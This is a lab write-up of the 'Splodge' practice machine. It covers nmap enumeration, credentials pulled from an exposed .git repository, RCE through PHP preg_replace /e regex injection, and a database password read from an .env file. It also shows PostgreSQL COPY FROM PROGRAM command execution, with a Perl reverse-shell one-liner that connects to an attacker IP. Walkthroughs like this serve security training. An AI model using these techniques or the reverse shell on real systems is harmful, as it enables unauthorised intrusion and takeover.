# Splodge

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.108
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-16 10:08 +08
Nmap scan report for 192.168.157.108
Host is up (0.17s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
5432/tcp open  postgresql
8080/tcp open  http-proxy
```

Did a detailed scan for the web ports too:

```
$ sudo nmap -p 80,1337,8080 -sC -sV --min-rate 3000 192.168.157.108     
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-16 10:09 +08
Nmap scan report for 192.168.157.108
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
| http-git: 
|   192.168.157.108:80/.git/
|     Git repository found!
|     .gitignore matched patterns 'bug' 'key'
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: initial commit 
|_    Project type: node.js application (guessed from .gitignore)
|_http-title: 403 Forbidden
1337/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Commando
8080/tcp open  http    nginx 1.16.1
|_http-title: Splodge | Home
|_http-server-header: nginx/1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit
```

There's a `.git` repository.

### Git Repo --> Creds

I downloaded the `.git` repository and looked through the logs with `git log -p -2`. However, it was way too long for me to analyse. Instead, I checked out the repository and checked for passwords:

```
$ grep -R password                                                 
database/migrations/2020_10_10_015036_create_settings_table.php:            $table->string('password');
database/seeds/DatabaseSeeder.php:            'password' => 'SplodgeSplodgeSplodge'
```

### Web Enum + Source Code --> RCE

Port 80 just showed us a 403 page, which was not helpful. Port 1337 did show some potential for RCE:

<figure><img src="../../../.gitbook/assets/image (2042).png" alt=""><figcaption></figcaption></figure>

However, I was unable to make anything happen. Port 8080 showed a blog page with an admin login:

<figure><img src="../../../.gitbook/assets/image (3407).png" alt=""><figcaption></figcaption></figure>

We can login to the admin panel using `admin:SplodgeSplodgeSplodge`:

<figure><img src="../../../.gitbook/assets/image (2708).png" alt=""><figcaption></figcaption></figure>

So now we know that the Git repository is for this application. This panel was rather interesting, because it has a 'Profanity Filter Regex' option, which I presume allows us to specify Regex strings within it.&#x20;

I was unable to find any source code for this Admin Panel specifically, but I can find some code to see what it does within `app/Http/Controllers`:

{% code title="PostController.php" %}
```php
public function comment(Request $request, Post $post)
    {
        error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED);
        $author = $request->input('commentAuthor');
        $message = $request->input('commentMessage');
        $settings = DB::table('settings')->first();
        $message = preg_replace($settings->filter, $settings->replacement, $message);
        DB::table('comments')->insert(['post_id' => $post->id, 'author' => $author, 'message' => $message]);
        $comments = DB::table('comments')->where('post_id', '=', $post->id)->get();
        return view('post', ['post' => $post, 'comments' => $comments]);
    }
```
{% endcode %}

It seems that there's a `preg_replace` function that replaces the regex matches with our replacement.&#x20;

Googling for PHP Regex exploits brings this up:

{% embed url="https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4" %}

From the article above, we can use regex of `/a/e` to inject PHP code. I tested this out:

<figure><img src="../../../.gitbook/assets/image (3430).png" alt=""><figcaption></figcaption></figure>

Afterwards, I sent one comment with the letter 'a' in it. When I did, I got a hit on my HTTP server:

<figure><img src="../../../.gitbook/assets/image (3400).png" alt=""><figcaption></figcaption></figure>

We now have RCE over the machine, and we can easily get a reverse shell on port 8080:

<figure><img src="../../../.gitbook/assets/image (499).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### PostgresSQL Creds --> User Shell

We spawned in the `/usr/share/nginx/html` folder, which had a `.env` file:

```
bash-4.2$ ls -al
total 180
drwxr-xr-x. 12   501 games   4096 Oct 17  2020 .
drwxr-xr-x.  5 root  root      49 Oct 17  2020 ..
-rw-r--r--.  1   501 games    362 Oct 17  2020 .env
drwxr-xr-x.  8 root  root     166 Oct 17  2020 .git
-rw-r--r--.  1   501 games    111 Jul  4  2017 .gitattributes
-rw-r--r--.  1   501 games    146 Jul  4  2017 .gitignore
drwxr-xr-x.  7 root  root      98 Oct 17  2020 app
-rwxr-xr-x.  1 root  root    1646 Jul  4  2017 artisan
drwxr-xr-x.  3 root  root      54 Oct 17  2020 bootstrap
-rw-r--r--.  1 root  root    1300 Jul  4  2017 composer.json
-rw-r--r--.  1 root  root  144904 Oct 11  2020 composer.lock
drwxr-xr-x.  2 root  root     209 Oct 17  2020 config
drwxr-xr-x.  5 root  root      90 Oct 17  2020 database
-rw-r--r--.  1 root  root    1043 Jul  4  2017 phpunit.xml
drwxr-xr-x.  3 root  root      71 Oct 17  2020 public
drwxr-xr-x.  5 root  root      45 Oct 17  2020 resources
drwxr-xr-x.  2 root  root      75 Oct 17  2020 routes
-rw-r--r--.  1 root  root     563 Jul  4  2017 server.php
drwxr-xr-x.  5 nginx nginx     46 Oct 17  2020 storage
drwxr-xr-x. 32 root  root    4096 Oct 11  2020 vendor

bash-4.2$ cat .env
APP_NAME=Splodge
APP_ENV=local
APP_KEY=base64:F9jFCNy0vJ1GhEsbf+PjmTSSHk8u741C5XNTN1Rguow=
APP_DEBUG=false
APP_LOG_LEVEL=info
APP_URL=http://splodge.offsec

DB_CONNECTION=pgsql
DB_HOST=127.0.0.1
DB_PORT=5432
DB_DATABASE=splodge
DB_USERNAME=postgres
DB_PASSWORD=PolicyWielderCandle120

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
QUEUE_DRIVER=sync
```

There's a database password there. We can then login with `psql` after fixing the `PATH` variable of this shell:

{% code overflow="wrap" %}
```
bash-4.2$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:$PATH

bash-4.2$ psql -U postgres -d splodge -h localhost
Password for user postgres: 
psql (12.4)
Type "help" for help.

splodge=# 
```
{% endcode %}

There's a feature within PostgreSQL that allows us to execute commands:

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

<figure><img src="../../../.gitbook/assets/image (1859).png" alt=""><figcaption></figcaption></figure>

We can just get another reverse shell using this:

{% code overflow="wrap" %}
```sql
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.196:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2400).png" alt=""><figcaption></figcaption></figure>

The payload is taken from Hacktricks.

### Root

User can run `bash` as `root`:

<figure><img src="../../../.gitbook/assets/image (494).png" alt=""><figcaption></figcaption></figure>
